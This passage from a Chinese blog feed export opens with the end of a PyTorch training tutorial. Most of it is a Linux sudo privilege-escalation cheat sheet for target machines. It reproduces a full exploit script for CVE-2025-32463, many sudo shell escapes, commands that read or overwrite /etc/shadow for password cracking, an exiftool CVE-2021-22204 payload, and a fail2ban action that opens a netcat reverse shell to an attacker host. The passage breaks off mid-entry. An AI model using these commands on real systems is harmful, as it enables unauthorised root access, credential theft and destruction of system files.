损失函数反向传播，求出每一个节点的梯度</span><br>            optimizer.step()            <span class="hljs-comment"># 对模型的每一个参数进行调优</span><br><br>            total_train_step += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> total_train_step % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;训练次数：&#123;&#125;，Loss：&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(total_train_step, loss.item()))<br>                writer.add_scalar(<span class="hljs-string">&quot;train_loss&quot;</span>, loss.item(), total_train_step)<br><br>        <span class="hljs-comment"># 测试步骤开始</span><br>        jimi.<span class="hljs-built_in">eval</span>()<br>        total_test_loss = <span class="hljs-number">0</span><br>        total_accuracy = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">with</span> torch.no_grad():<br>            <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> test_dataloader:<br>                imgs, targets = data<br>                imgs = imgs.to(device)  <span class="hljs-comment"># 将图像移动到设备</span><br>                targets = targets.to(device)  <span class="hljs-comment"># 将标签移动到设备</span><br>                outputs = jimi(imgs)<br>                loss = loss_fn(outputs, targets)<br>                total_test_loss += loss.item()<br>                accuracy = (outputs.argmax(<span class="hljs-number">1</span>) == targets).<span class="hljs-built_in">sum</span>()<br>                total_accuracy += accuracy.item()  <span class="hljs-comment"># 修复：使用 .item() 转换为标量</span><br><br><br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;整体测试集上的Loss: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(total_test_loss))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;整体测试集上的正确率: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(total_accuracy / test_data_size))<br>        writer.add_scalar(<span class="hljs-string">&quot;test_loss&quot;</span>, total_test_loss, total_test_step)<br>        writer.add_scalar(<span class="hljs-string">&quot;test_accuracy&quot;</span>, total_accuracy / test_data_size, total_test_step)<br>        total_test_step = total_test_step + <span class="hljs-number">1</span><br><br>        torch.save(jimi, <span class="hljs-string">&quot;jimi_&#123;&#125;.pth&quot;</span>.<span class="hljs-built_in">format</span>(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;模型已保存&quot;</span>)<br><br>    writer.close()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br><br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/34.png"></p>]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>transforms</tag>
      
      <tag>TensorBoard</tag>
      
      <tag>torchvision</tag>
      
      <tag>DataLoader</tag>
      
      <tag>神经网络</tag>
      
      <tag>nn.module</tag>
      
      <tag>卷积层</tag>
      
      <tag>池化层</tag>
      
      <tag>非线性激活</tag>
      
      <tag>线性层及其他层</tag>
      
      <tag>Sequential小实战</tag>
      
      <tag>损失函数与反向传播</tag>
      
      <tag>优化器（训练）</tag>
      
      <tag>模型训练</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权-利用sudo提权超级无敌大汇总</title>
    <link href="/2025/07/04/Linux%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E5%A4%A7%E6%B1%87%E6%80%BB/"/>
    <url>/2025/07/04/Linux%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E5%A4%A7%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p>如果提权失败的话，自己去深入看一下提权的原理，万一是笔记写错了呢？！！</p><p>通篇文章的内容都有一个前置条件：sudo -l 有利用的提权信息，若此文章无成功提权，要再多试试别的方法</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l列出当前用户可以直接通过 sudo 执行的命令。（可以查看/etc/sudoers 文件中的配置）<br>whoami查看用户名<br>id用户组<br>ip aip地址<br>su提权到root<br>uname -a显示操作系统的信息<br>sudo -V | grep version查看sudo版本<br></code></pre></td></tr></table></figure><h3 id="提权总结："><a href="#提权总结：" class="headerlink" title="提权总结："></a>提权总结：</h3><pre><code class="hljs">    * 某些组件/命令/任务/anything 拥有 sudo 的直接运行权限    * 或者这些命令可以引用自定义的第三方库/脚本    * 语言有免密 root 的运行权限的话，都可以构造进行提权    * 可以调用命令行的程序/工具的参数</code></pre><h3 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h3><ol><li>**hash破解：**john shadow_hash –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</li><li><strong>无需密码 root 执行： sudo -l</strong>：(root) <strong>NOPASSWD</strong>: &#x2F;usr&#x2F;bin&#x2F;***</li><li><strong>提升命令行交互性</strong>：<ol><li>python3 -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</li><li>新建反弹 shell</li></ol></li></ol><h1 id="提权命令"><a href="#提权命令" class="headerlink" title="提权命令"></a>提权命令</h1><h2 id="sudo-version-≤-1-8-28"><a href="#sudo-version-≤-1-8-28" class="headerlink" title="sudo version ≤ 1.8.28"></a>sudo version ≤ 1.8.28</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -V | grep version<span class="hljs-comment">#查看版本</span><br><br><span class="hljs-built_in">sudo</span> -u#-1 /bin/bash<span class="hljs-comment">#提权</span><br></code></pre></td></tr></table></figure><h2 id="sudo-chwoot"><a href="#sudo-chwoot" class="headerlink" title="sudo chwoot"></a>sudo chwoot</h2><p>CVE-2025-32463：影响版本1.9.14 &lt;&#x3D; sudo &lt;&#x3D; 1.9.17</p><p>在靶机中运行此sh脚本即可获取root权限(运行的时候把代码旁边的注释去掉)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">sudo-chwoot.sh</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">                 @ Stratascale Cyber Research Unit (CRU)</span><br>STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)             #创建一个临时目录<br>cd $&#123;STAGE?&#125; || exit 1                                    #进入该目录 如果失败则退出脚本<br><br>cat &gt; woot1337.c&lt;&lt;EOF                                     #生成一个c文件<br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;stdlib.h&gt;</span>   <br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;unistd.h&gt;</span><br><br>__attribute__((constructor)) void woot(void) &#123;<br>  setreuid(0,0);                                          #将进程的真实用户id和有效用户id设置为0，进程变为root用户<br>  setregid(0,0);<br>  chdir(&quot;/&quot;);                                             #改变当前工作目录为根目录<br>  execl(&quot;/bin/bash&quot;, &quot;/bin/bash&quot;, NULL);                  #启动一个新的bash，程序将成为root<br>&#125;<br>EOF<br><br>mkdir -p woot/etc libnss_<br>echo &quot;passwd: /woot1337&quot; &gt; woot/etc/nsswitch.conf<br>cp /etc/group woot/etc<br><span class="hljs-meta prompt_">#</span><span class="language-bash">编译恶意共享库</span><br>gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c<br><br>echo &quot;woot!&quot;<br>sudo -R woot woot<br>rm -rf $&#123;STAGE?&#125;<br><br></code></pre></td></tr></table></figure><h2 id="sudo-apt"><a href="#sudo-apt" class="headerlink" title="sudo apt"></a>sudo apt</h2><p>sudo -l列出枚举项包含 apt 项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update -o APT::Update::Pre-Invoke::=/bin/bash<br></code></pre></td></tr></table></figure><p>sudo apt-get 同样适用</p><h2 id="sudo-apache2"><a href="#sudo-apache2" class="headerlink" title="sudo apache2"></a>sudo apache2</h2><p>sudo -l 有 apache2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apache2 -f /etc/shadow<br></code></pre></td></tr></table></figure><p>拿到 hash 加密的 root 密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> john hash_passwd --wordlist=/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><h2 id="sudo-ash"><a href="#sudo-ash" class="headerlink" title="sudo ash"></a>sudo ash</h2><p>sudo -l </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ash<br></code></pre></td></tr></table></figure><h2 id="sudo-awk"><a href="#sudo-awk" class="headerlink" title="sudo awk"></a>sudo awk</h2><p>传递脚本的方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span> <br></code></pre></td></tr></table></figure><h2 id="sudo-base64"><a href="#sudo-base64" class="headerlink" title="sudo base64"></a>sudo base64</h2><p>base32 base48 同理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">cat</span> /etc/shadow  //无权限<br>a=/etc<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>&quot;</span> | <span class="hljs-built_in">base64</span> -d<span class="hljs-comment">#有看shadow的权限，原因是base64有直接的sudo运行权限</span><br><br>拿到shadow之后，使用john破解<br></code></pre></td></tr></table></figure><h2 id="sudo-bash"><a href="#sudo-bash" class="headerlink" title="sudo bash"></a>sudo bash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> bash <span class="hljs-comment">#直接实现提权</span><br><span class="hljs-built_in">sudo</span> csh/dash/sh/tclsh/zsh <span class="hljs-comment">#这几种都是常见的bash环境可以实现提权</span><br></code></pre></td></tr></table></figure><h2 id="sudo-cp"><a href="#sudo-cp" class="headerlink" title="sudo cp"></a>sudo cp</h2><p>此操作有后果：会导致靶机中的 shadow 文件的内容都<strong>被覆盖掉且不可恢复</strong></p><p>原理是将自己创建的 <strong>123456</strong> <strong>覆盖</strong>掉之前的 <strong>shadow</strong> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<span class="hljs-comment">#当前用户不需要用户密码就可以直接使用cp命令</span><br>(root)NOPASSWD:/usr/bin/cp<br></code></pre></td></tr></table></figure><p>将修改的 root 信息存好</p><p><img src="/../img/Linux%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E5%A4%A7%E6%B1%87%E6%80%BB.md/3.png"></p><p>在靶机中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=/etc/shadow<br>TF=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;修改好的root信息&#x27;</span> &gt; <span class="hljs-variable">$TF</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$TF</span><br>/tmp/tmp.RmdhLEDVdO<br><span class="hljs-built_in">cat</span> /tmp/tmp.RmdhLeDVdO<br>//输出修改好的root信息<br><br><span class="hljs-built_in">sudo</span> /usr/bin/cp <span class="hljs-variable">$TF</span> <span class="hljs-variable">$a</span><span class="hljs-comment">#会覆盖之前的shadow</span><br>su<br>123456<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-cpulimit"><a href="#sudo-cpulimit" class="headerlink" title="sudo cpulimit"></a>sudo cpulimit</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> cpulimit -l 100 -f /bin/bash<br>-l:限制cpu使用率<br>-f：指定一个程序受到-l参数的限制<br></code></pre></td></tr></table></figure><h2 id="sudo-curl"><a href="#sudo-curl" class="headerlink" title="sudo curl"></a>sudo curl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure><p><img src="/../img/Linux%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E5%A4%A7%E6%B1%87%E6%80%BB.md/3.png"></p><p>将获取到的 root 信息存储到：shadow_entry 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> php -S 0:80<span class="hljs-comment">#在kali本地80端口开启一个php服务</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> curl http://kali_ip/shadow_entry -o /etc/shadow<span class="hljs-comment">#靶机sudo权限curl后覆盖原始的shadow</span><br></code></pre></td></tr></table></figure><h2 id="sudo-date"><a href="#sudo-date" class="headerlink" title="sudo date"></a>sudo date</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">date</span> -f /etc/shadow<br>泄露了整个shadow文件的信息<br>jonh破解<span class="hljs-built_in">hash</span>密码<br></code></pre></td></tr></table></figure><h2 id="sudo-dd"><a href="#sudo-dd" class="headerlink" title="sudo dd"></a>sudo dd</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure><p><img src="/../img/Linux%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E5%A4%A7%E6%B1%87%E6%80%BB.md/3.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;生成的root信息&#x27;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">dd</span> of=/etc/shadow <br></code></pre></td></tr></table></figure><h2 id="sudo-dstat"><a href="#sudo-dstat" class="headerlink" title="sudo dstat"></a>sudo dstat</h2><p>利用点：dstat 可以指定插件名来<strong>执行外部的插件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name dstat -<span class="hljs-built_in">type</span> d 2&gt;/dev/null<br>    /usr/share/doc/dstat<br>    /usr/share/dstat<br><span class="hljs-built_in">ls</span> /usr/share/dstat<br>vim dstat_BinBash.py<br>  import os;os.execv(<span class="hljs-string">&quot;/bin/bash&quot;</span>,[<span class="hljs-string">&quot;bash&quot;</span>])<br><span class="hljs-built_in">cp</span> dstat_BinBash.py /usr/share/dstat/dstat_BinBash.py<br><span class="hljs-built_in">sudo</span> dstat --BinBash<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-ed"><a href="#sudo-ed" class="headerlink" title="sudo ed"></a>sudo ed</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> /usr/bin/ed<span class="hljs-comment">#进入ed编辑器</span><br>!/bin/bash<span class="hljs-comment">#提权</span><br></code></pre></td></tr></table></figure><h2 id="sudo-env"><a href="#sudo-env" class="headerlink" title="sudo env"></a>sudo env</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l <br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">env</span> /bin/bash<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-exiftool"><a href="#sudo-exiftool" class="headerlink" title="sudo exiftool"></a>sudo exiftool</h2><p>CVE-2021-22204  version:7.44-12.23</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br>exiftool -ver<span class="hljs-comment">#查看是否为漏洞版本</span><br>vi payload<br>(metadata <span class="hljs-string">&quot;\c<span class="hljs-variable">$&#123;system(&#x27;bin/bash&#x27;)&#125;</span>;&quot;</span>) <span class="hljs-comment">#写入payload</span><br>bzz payload payload.bzz<span class="hljs-comment">#使用bzz工具对payload进行压缩</span><br>djvumake exploit.djvu INFO=<span class="hljs-string">&#x27;1,1&#x27;</span> BGjp=/dev/null ANTz=payload.bzz <span class="hljs-comment">#图片处理</span><br><span class="hljs-built_in">sudo</span> exiftool exploit.djvu<br><br></code></pre></td></tr></table></figure><h2 id="sudo-expect"><a href="#sudo-expect" class="headerlink" title="sudo expect"></a>sudo expect</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> expect -c <span class="hljs-string">&quot;spawn /bin/bash;interact&quot;</span><br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-fail2ban"><a href="#sudo-fail2ban" class="headerlink" title="sudo fail2ban"></a>sudo fail2ban</h2><p>反复登录 ssh，超过 3 次（诸如此类限制）就会把访问 ip 办掉</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br>find / -name <span class="hljs-string">&quot;fail2ban*&quot;</span> -<span class="hljs-built_in">type</span> d 2&gt;/dev/null<br>  /usr/share/doc/fail2ban<br>  /usr/lib/python3/dist-packages/fail2ban-0.11.2.egg-info<br>  /usr/lib/python3/dist-packages/fail2ban<br>  /run/fail2ban<br>  /var/lib/fail2ban<br>  /etc/fail2ban<br>  /etc/fail2ban/fail2ban.d<br><br>find /etc -writable -<span class="hljs-built_in">type</span> d 2&gt;/dev/null<br>  /etc/fail2ban/action.d<br><br><span class="hljs-built_in">cd</span> /etc/fail2ban/<br><span class="hljs-built_in">ls</span><br>vim jail.conf<br></code></pre></td></tr></table></figure><p><img src="/../img/Linux%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E5%A4%A7%E6%B1%87%E6%80%BB.md/4.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /etc/fail2ban/action.d<span class="hljs-comment">#脚本目录</span><br></code></pre></td></tr></table></figure><p><img src="/../img/Linux%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E5%A4%A7%E6%B1%87%E6%80%BB.md/5.png"></p><p><img src="/../img/Linux%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E5%A4%A7%E6%B1%87%E6%80%BB.md/6.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">actionban = <span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc Kali_IP 9595 &gt; /tmp/f<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /etc/init.d/fail2ban restart//重启fail2ban服务<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nc -lvnp 9595<span class="hljs-comment">#启动监听</span><br><span class="hljs-built_in">sudo</span> shh Baji_Username@Baji_IP<span class="hljs-comment">#ssh连接靶机</span><br>多次输入错误密码，超过maxrety后执行actionban脚本提权。<br></code></pre></td></tr></table></figure><h2 id="sudo-find"><a href="#sudo-find" class="headerlink" title="sudo find"></a>sudo find</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> find . -<span class="hljs-built_in">exec</span> /bin/bash \; -quit<br></code></pre></td></tr></table></figure><h2 id="sudo-flock"><a href="#sudo-flock" class="headerlink" title="sudo flock"></a>sudo flock</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> flock -u / /bin/bash<br></code></pre></td></tr></table></figure><h2 id="sudo-ftp"><a href="#sudo-ftp" class="headerlink" title="sudo ftp"></a>sudo ftp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> ftp<br>  !/bin/bash<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-gcc"><a href="#sudo-gcc" class="headerlink" title="sudo gcc"></a>sudo gcc</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> gcc -wrapper /bin/bash,-s .<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-gdb"><a href="#sudo-gdb" class="headerlink" title="sudo gdb"></a>sudo gdb</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> gdb -nx -ex <span class="hljs-string">&#x27;!bash&#x27;</span> -ex quit<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-git"><a href="#sudo-git" class="headerlink" title="sudo git"></a>sudo git</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> git branch --<span class="hljs-built_in">help</span><br>在这个界面不要洞，摁esc然后冒号，输入!/bin/bash<br>成功<br></code></pre></td></tr></table></figure><p><img src="/../img/Linux%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E5%A4%A7%E6%B1%87%E6%80%BB.md/7.png"></p><h2 id="sudo-gzip-gunzip"><a href="#sudo-gzip-gunzip" class="headerlink" title="sudo gzip&#x2F;gunzip"></a>sudo gzip&#x2F;gunzip</h2><p>gzip&#x2F;gunzip 用法相同</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> gzip -f /etc/shadow -t <span class="hljs-comment">#-f:强制执行</span><br>拿到shadow内容，使用john破解<br>su<span class="hljs-comment">#登录root</span><br></code></pre></td></tr></table></figure><h2 id="sudo-hping3"><a href="#sudo-hping3" class="headerlink" title="sudo hping3"></a>sudo hping3</h2><p>hping3：用于分析和测试网络环境，生成各种网络包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> hping3<br>  /bin/bash<br></code></pre></td></tr></table></figure><h2 id="sudo-iftop"><a href="#sudo-iftop" class="headerlink" title="sudo iftop"></a>sudo iftop</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> iftop<br>  !/bin/bash<br></code></pre></td></tr></table></figure><p><img src="/../img/Linux%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E5%A4%A7%E6%B1%87%E6%80%BB.md/8.png"></p><p><img src="/../img/Linux%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E5%A4%A7%E6%B1%87%E6%80%BB.md/9.png"></p><h2 id="sudo-java"><a href="#sudo-java" class="headerlink" title="sudo java"></a>sudo java</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-comment">#遇到大的语言程序，想到的就是使用语言本身来进行提权</span><br></code></pre></td></tr></table></figure><figure class="highlight 